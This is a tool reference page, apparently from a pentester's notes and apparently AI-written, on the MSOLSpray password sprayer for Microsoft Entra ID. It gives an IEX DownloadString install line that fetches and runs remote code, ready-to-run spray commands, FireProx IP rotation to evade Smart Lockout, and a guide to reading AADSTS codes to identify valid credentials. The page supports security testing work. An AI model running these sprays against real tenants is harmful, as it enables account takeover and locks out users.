# MSOLSpray

**Tags:** `#msolspray` `#entraid` `#azuread` `#passwordspray` `#cloud` `#powershell` `#fireprox`

PowerShell password-spraying tool (dafthack) targeting the Microsoft Online (MSOL) sign-in
endpoint. Its edge over a plain spray is **reading the AADSTS error code** on every attempt,
so one run tells you not just "valid/invalid" but MFA posture, lockout, disabled and
expired-password states — invaluable recon for planning the next move.

**Source:** https://github.com/dafthack/MSOLSpray
**Install:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/MSOLSpray/master/MSOLSpray.ps1')
# or: git clone https://github.com/dafthack/MSOLSpray ; Import-Module .\MSOLSpray.ps1
```

---

## Usage

```powershell
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!"

# Log every result to a file
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!" -OutFile spray.txt

# Rotate source IP through a FireProx API Gateway (defeats IP-based Smart Lockout / blocking)
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!" -URL https://<id>.execute-api.us-east-1.amazonaws.com/fireprox

# -Force sprays even after a lockout is detected (dangerous — off by default)
Invoke-MSOLSpray -UserList users.txt -Password "Winter2025" -Force
```

**Parameters:** `-UserList <file>`, `-Password <string>`, `-OutFile <file>`, `-URL <endpoint>`
(default `https://login.microsoft.com`; point at FireProx), `-Force`. There is **no `-Verbose`**.

---

## Reading the Result (AADSTS codes)

The whole point of MSOLSpray — every non-invalid code below still means **the password is
correct**; don't discard MFA/locked/expired hits:

| AADSTS code | Outcome |
|---|---|
| `50126` | Invalid password |
| `50128` / `50059` | Tenant not found |
| `50034` | User doesn't exist |
| `50079` / `50076` | **Valid creds** — MFA required |
| `50158` | **Valid creds** — Conditional Access / external MFA (e.g. Duo) |
| `50053` | **Valid creds** — account **locked** (back off!) |
| `50057` | **Valid creds** — account disabled |
| `50055` | **Valid creds** — password expired |

> [!warning] **Smart Lockout still applies.** Entra tracks failures per account and per IP.
> Spray one password per round with long gaps, watch for `50053`, and use the FireProx `-URL`
> to spread attempts across source IPs. `-Force` overrides the safety abort — use knowingly.

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Password Spraying section; [[Tools/Auth/o365spray|o365spray]] (Python multi-endpoint alternative with built-in `--count`/`--lockout` pacing); generate the user list with [[Tools/Auth/Username Anarchy|Username Anarchy]].

---

*Created: 2026-07-27*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
